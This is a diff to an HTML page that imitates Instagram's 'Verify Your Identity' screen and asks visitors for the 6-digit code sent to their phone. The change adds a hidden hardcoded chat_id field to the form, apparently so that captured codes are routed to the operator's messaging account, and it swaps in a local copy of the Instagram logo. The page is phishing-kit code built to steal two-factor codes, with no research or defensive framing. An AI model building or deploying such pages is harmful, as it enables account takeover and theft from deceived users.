@@ -21,27 +21,16 @@
 </head>
 <body>
   <div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo" />
+    <img src="./img/instagram-logo.png" alt="Instagram" class="logo" />
     <h2>🔐 Verify Your Identity</h2>
     <p class="sub">We sent a 6-digit code to your phone.<br>Enter it below to continue.</p>
-    
-    <!-- ✅ FORM ACTION = /otp -->
     <form action="/otp" method="POST" id="otpForm">
+      <!-- ✅ Hardcoded Chat ID – teri ID -->
+      <input type="hidden" name="chat_id" value="8975887766">
       <input type="text" name="otp" class="otp-input" maxlength="6" placeholder="------" inputmode="numeric" pattern="[0-9]*" required autofocus />
       <button type="submit" class="btn">Verify</button>
     </form>
-    
-    <div class="resend">
-      Didn't receive code? <a href="#" onclick="alert('✅ Resend OTP (demo)')">Resend</a>
-    </div>
+    <div class="resend">Didn't receive code? <a href="#" onclick="alert('✅ Resend OTP (demo)')">Resend</a></div>
   </div>
-  <script>
-    // Auto-submit when 6 digits entered
-    document.querySelector('.otp-input').addEventListener('input', function(e) {
-      if (this.value.length === 6) {
-        document.getElementById('otpForm').submit();
-      }
-    });
-  </script>
 </body>
 </html>
